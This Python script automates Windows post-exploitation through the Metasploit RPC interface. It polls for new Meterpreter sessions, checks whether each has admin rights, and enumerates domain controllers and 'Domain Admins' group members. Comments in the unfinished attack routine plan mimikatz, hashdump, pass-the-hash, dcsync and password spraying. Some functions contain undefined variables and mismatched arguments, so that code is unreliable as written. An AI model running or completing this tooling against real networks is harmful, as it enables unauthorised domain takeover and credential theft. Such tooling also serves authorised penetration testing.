#!/usr/bin/env python3

import re
import os
import sys
import time
import signal
import msfrpc
import asyncio
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError

NEW_SESS_DATA = {}
DOMAIN_DATA = {'domain':None, 'domain_admins':[], 'domain_controllers':[], 'high_priority_ips':[], 'error':None}

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='123', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg, sess_num):
    if sess_num:
        print(colored('[-] ', 'red') + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[-] ', 'red') + msg)

def print_info(msg, sess_num):
    if sess_num:
        print(colored('[*] ', 'blue') + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[*] ', 'blue') + msg)

def print_good(msg, sess_num):
    if sess_num:
        print(colored('[+] ', 'green') + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[+] ', 'green') + msg)

def print_great(msg, sess_num):
    if sess_num:
        print(colored('[*] ', 'yellow', attrs=['bold']) + 'Session {} '.format(str(sess_num)).ljust(12)+'- '+msg)
    else:
        print(colored('[!] ', 'yellow') + msg)

def kill_tasks():
    print()
    print_info('Killing tasks then exiting...', None)
    for task in asyncio.Task.all_tasks():
        task.cancel()

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

async def get_shell_info(client, sess_num):
    sysinfo_cmd = 'sysinfo'
    sysinfo_end_str = b'Meterpreter     : '

    sysinfo_output = await run_session_cmd(client, sess_num, sysinfo_cmd, sysinfo_end_str)
    # Catch error
    if type(sysinfo_output) == str:
        return sysinfo_output

    else:
        sysinfo_utf8_out = sysinfo_output.decode('utf8')
        sysinfo_split = sysinfo_utf8_out.splitlines()

    getuid_cmd = 'getuid'
    getuid_end_str = b'Server username:'

    getuid_output = await run_session_cmd(client, sess_num, getuid_cmd, getuid_end_str)
    # Catch error
    if type(getuid_output) == str:
        return getuid_output
    else:
        getuid_utf8_out = getuid_output.decode('utf8')
        getuid = 'User            : '+getuid_utf8_out.split('Server username: ')[-1].strip().strip()

    # We won't get here unless there's no errors
    shell_info_list = [getuid] + sysinfo_split

    return shell_info_list

def get_domain(shell_info):
    for l in shell_info:
        l_split = l.split(':')
        if 'Domain      ' in l_split[0]:
            if 'WORKGROUP' in l_split[1]:
                return
            else:
                domain = l_split[-1].strip()
                return domain

def is_domain_joined(user_info, domain):
    info_split = user_info.split(':')
    dom_and_user = info_split[1].strip()
    dom_and_user_split = dom_and_user.split('\\')
    dom = dom_and_user_split[0]
    user = dom_and_user_split[1]

    if domain:
        if dom.lower() in domain.lower():
            return True

    return False

def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
    print_info('New shell info', None)
    for l in shell_info:
        print('        '+l)
    msg =  '''        Admin shell     : {}
        Local admin     : {}
        Session number  : {}'''.format( 
                              admin_shell.decode('utf8'), 
                              local_admin.decode('utf8'),
                              sess_num_str)
    print(msg)

async def check_domain_joined(client, sess_num, shell_info):
    global NEW_SESS_DATA

    # returns either a string of the domain name or False
    domain = get_domain(shell_info)
    if domain:
        NEW_SESS_DATA[sess_num][b'domain'] = domain.encode()

    domain_joined = is_domain_joined(shell_info[0], domain)
    if domain_joined == True:
        NEW_SESS_DATA[sess_num][b'domain_joined'] = b'True'
    else:
        NEW_SESS_DATA[sess_num][b'domain_joined'] = b'False'

async def sess_first_check(client, sess_num):
    global NEW_SESS_DATA

    if b'first_check' not in NEW_SESS_DATA[sess_num]:
        print_good('Gathering shell info...', sess_num)

        # Give meterpeter chance to open
        await asyncio.sleep(2)

        sess_num_str = str(sess_num)
        NEW_SESS_DATA[sess_num][b'first_check'] = b'False'
        NEW_SESS_DATA[sess_num][b'busy'] = b'False'
        NEW_SESS_DATA[sess_num][b'session_number'] = sess_num_str.encode()

        shell_info = await get_shell_info(client, sess_num)
        # Catch errors
        if type(shell_info) == str:
            NEW_SESS_DATA[sess_num][b'error'] = shell_info.encode()
            return

        # Check if we're domain joined
        await check_domain_joined(client, sess_num, shell_info)

        admin_shell, local_admin = await is_admin(client, sess_num)
        # Catch errors
        if type(admin_shell) == str:
            NEW_SESS_DATA[sess_num][b'error'] = admin_shell.encode()
            return

        NEW_SESS_DATA[sess_num][b'admin_shell'] = admin_shell
        NEW_SESS_DATA[sess_num][b'local_admin'] = local_admin

        print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)

        # Update DOMAIN_DATA for domain admins and domain controllers
        await get_domain_data(client, sess_num)

async def is_admin(client, sess_num):
    cmd = 'run post/windows/gather/win_privs'

    output = await run_session_cmd(client, sess_num, cmd, None)
    # Catch error
    if type(output) == str:
        return (output, None)

    if output:
        split_out = output.decode('utf8').splitlines()
        user_info_list = split_out[5].split()
        admin_shell = user_info_list[0]
        system = user_info_list[1]
        local_admin = user_info_list[2]
        user = user_info_list[5]

        # Byte string
        return (str(admin_shell).encode(), str(local_admin).encode())

    else:
        return (b'ERROR', b'ERROR')

async def get_domain_controllers(client, sess_num):
    global DOMAIN_DATA

    print_info('Getting domain controller...', sess_num)
    cmd = 'run post/windows/gather/enum_domains'
    end_str = b'[+] Domain Controller:'

    output = await run_session_cmd(client, sess_num, cmd, end_str)
    # Catch timeout
    if type(output) == str:
        DOMAIN_DATA['error'].append(sess_num)

    output = output.decode('utf8')
    if 'Domain Controller: ' in output:
        dc = output.split('Domain Controller: ')[-1].strip()
        if dc not in DOMAIN_DATA['domain_controllers']:
            DOMAIN_DATA['domain_controllers'].append(dc)
            print_good('Domain controller: '+dc, sess_num)

async def get_domain_admins(client, sess_num, ran_once):
    global DOMAIN_DATA

    print_info('Getting domain admins...', sess_num)
    cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
    end_str = b'[+] User list'

    output = await run_session_cmd(client, sess_num, cmd, end_str)
    # Catch timeout
    if type(output) == str:
        DOMAIN_DATA['error'].append(sess_num)
        return

    output = output.decode('utf8')
    da_line_start = '[*] \t'

    if da_line_start in output:
        split_output = output.splitlines()

        domain_admins = []
        for l in split_output:
            if l.startswith(da_line_start):
                domain_admin = l.split(da_line_start)[-1].strip()
                domain_admins.append(domain_admin)

        for x in domain_admins:
            if x not in DOMAIN_DATA['domain_admins']:
                print_good('Domain admin: '+x, sess_num)
                DOMAIN_DATA['domain_admins'].append(x)

    # If we don't get any DAs from the shell we try one more time
    else:
        if ran_once:
            print_bad('No domain admins found', sess_num)
        else:
            print_bad('No domain admins found, trying one more time', sess_num)
            await get_domain_admins(client, sess_num, True)

async def get_domain_data(client, sess_num):
    ''' Callback for after we gather all the initial shell data '''
    global DOMAIN_DATA

    # Update domain data
    if b'domain' in NEW_SESS_DATA[sess_num]:
        DOMAIN_DATA['domain'] = NEW_SESS_DATA[sess_num][b'domain']

    # If no domain admin list found yet then find them
    if NEW_SESS_DATA[sess_num][b'domain_joined'] == b'True':
        if len(DOMAIN_DATA['domain_admins']) == 0:
            await get_domain_admins(client, sess_num, False)
        if len(DOMAIN_DATA['domain_controllers']) == 0:
            await get_domain_controllers(client, sess_num)

def update_session(session, sess_num):
    global NEW_SESS_DATA

    if sess_num in NEW_SESS_DATA:
        # Update session with the new key:value's in NEW_SESS_DATA
        # This will not change any of the MSF session data, just add new key:value pairs
        NEW_SESS_DATA[sess_num] = add_session_keys(session)
    else:
        NEW_SESS_DATA[sess_num] = session

async def gather_passwords(client, sess_num):
    #mimikatz
    #mimikittenz
    #hashdump
    pass

async def attack(client, sess_num):

    # Make sure it got the admin_shell info added
    #if b'admin_shell' in NEW_SESS_DATA[sess_num]:

    # Is admin
    if NEW_SESS_DATA[sess_num][b'admin_shell'] == b'True':
        # mimikatz, spray, PTH RID 500 
        await gather_passwords(client, sess_num)

    elif NEW_SESS_DATA[sess_num][b'admin_shell'] == b'False':
        if NEW_SESS_DATA[sess_num][b'local_admin'] == b'True':
            # Getsystem > mimikatz, spray, PTH rid 500
            pass
        if NEW_SESS_DATA[sess_num][b'local_admin'] == b'False':
            # Give up
            pass

    # START ATTACKING! FINALLY!
    # not domain joined and not admin
        # fuck it?
    # not domain joined but admin
        # mimikatz
    # domain joined and not admin
        # GPP privesc
        # Check for seimpersonate
        # Check for dcsync
        # userhunter
        # spray and pray
    # domain joined and admin
        # GPP
        # userhunter
        # spray and pray


async def attack_with_session(client, session, sess_num):
    ''' Attacks with a session '''
    update_session(session, sess_num)

    # Get and print session info if first time we've checked the session
    #asyncio.ensure_future(sess_first_check(client, sess_num))
    task = await sess_first_check(client, sess_num)
    if task:
        await asyncio.wait(task)

    if is_session_broken(sess_num) == False:
        await attack(client, sess_num)

def get_output(client, cmd, sess_num):
    output = client.call('session.meterpreter_read', [str(sess_num)])

    # Everythings fine
    if b'data' in output:
        return output[b'data']

    # Got an error from the client.call
    elif b'error_message' in output:
        decoded_err = output[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, decoded_err), sess_num)
        return decoded_err

    # Some other error catchall
    else:
        return cmd

def get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs):
    script_errors = [b'[-] post failed', 
                     b'error in script', 
                     b'operation failed', 
                     b'unknown command', 
                     b'operation timed out']

    # Got an error from output
    if any(x in output.lower() for x in script_errors):
        print_bad('Command [{}] failed with error: {}'.format(cmd, output.decode('utf8').strip()), sess_num)
        return cmd, counter

    # If no terminating string specified just wait til timeout
    if output == b'':
        counter += sleep_secs
        if counter > timeout:
            print_bad('Command [{}] timed out'.format(cmd), sess_num)
            return 'timed out', counter

    # No output but we haven't reached timeout yet
    return output, counter

async def run_session_cmd(client, sess_num, cmd, end_str, timeout=30):
    ''' Will only return a str if we failed to run a cmd'''
    global NEW_SESS_DATA

    error_msg = 'Error in session {}: {}'
    sess_num_str = str(sess_num)

    print_info('Running [{}]'.format(cmd), sess_num)

    while NEW_SESS_DATA[sess_num][b'busy'] == b'True':
        await asyncio.sleep(1)

    NEW_SESS_DATA[sess_num][b'busy'] = b'True'

    res = client.call('session.meterpreter_run_single', [str(sess_num), cmd])

    if b'error_message' in res:
        err_msg = res[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, err_msg), sess_num)
        return err_msg

    elif res[b'result'] == b'success':

        counter = 0
        sleep_secs = 0.5

        try:
            while True:
                await asyncio.sleep(sleep_secs)

                output = get_output(client, cmd, sess_num)
                # Error from meterpreter console
                if type(output) == str:
                    NEW_SESS_DATA[sess_num][b'busy'] = b'False'
                    return output

                # Successfully completed
                if end_str:
                    if end_str in output:
                        NEW_SESS_DATA[sess_num][b'busy'] = b'False'
                        return output
                # If no end_str specified just return once we have any data
                else:
                    if len(output) > 0:
                        NEW_SESS_DATA[sess_num][b'busy'] = b'False'
                        return output

                # Check for errors from cmd's output
                output, counter = get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs)
                # Error from cmd output including timeout
                if type(output) == str:
                    NEW_SESS_DATA[sess_num][b'busy'] = b'False'
                    return output

        # This usually occurs when the session suddenly dies or user quits it
        except Exception as e:
            err = 'exception below likely due to abrupt death of session'
            print_bad(error_msg.format(sess_num_str, err), sess_num)
            print_bad('    '+str(e), None)
            NEW_SESS_DATA[sess_num][b'busy'] = b'False'
            return err

    # b'result' not in res, b'error_message' not in res, just catch everything else as an error
    else:
        print_bad(res[b'result'].decode('utf8'), sess_num)
        NEW_SESS_DATA[sess_num][b'busy'] = b'True'
        return cmd
    
def get_perm_token(client):
    # Authenticate and grab a permanent token
    client.login(args.username, args.password)
    client.call('auth.token_add', ['123'])
    client.token = '123'
    return client

def is_session_broken(sess_num):
    ''' We remove 2 kinds of errored sessions: 1) timed out on sysinfo 2) shell died abruptly '''
    global NEW_SESS_DATA

    if b'error' in NEW_SESS_DATA[sess_num]:
        # Session timed out on initial sysinfo cmd
        if b'domain' not in NEW_SESS_DATA:
            return True
        # Session abruptly died
        elif NEW_SESS_DATA[s][b'error'] == b'exception below likely due to abrupt death of session':
            return True
        # Session timed out
        elif 'Rex::TimeoutError' in NEW_SESS_DATA[s][b'error']:
            return True

    return False

def add_session_keys(session, sess_num):
    for k in NEW_SESS_DATA[s]:
        if k not in session:
            session[k] = NEW_SESS_DATA[sess_num].get(k)

    return session

async def check_for_sessions(client, loop):
    global NEW_SESS_DATA

    print_info('Waiting for Meterpreter shell', None)

    while True:

        # Get list of MSF sessions from RPC server
        sessions = client.call('session.list')

        for s in sessions:

            # Do stuff with session
            if s not in NEW_SESS_DATA:
                asyncio.ensure_future(attack_with_session(client, sessions[s], s))

        await asyncio.sleep(1)

def main(args):

    client = msfrpc.Msfrpc({})
    client = get_perm_token(client)

    loop = asyncio.get_event_loop()
    loop.add_signal_handler(signal.SIGINT, kill_tasks)
    task = check_for_sessions(client, loop)
    try:
        loop.run_until_complete(task)
    except asyncio.CancelledError:
        print_info('Tasks gracefully downed a cyanide pill before defecating themselves and collapsing in a twitchy pile', None)
    finally:
        loop.close()

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root', None)
        sys.exit()
    main(args)

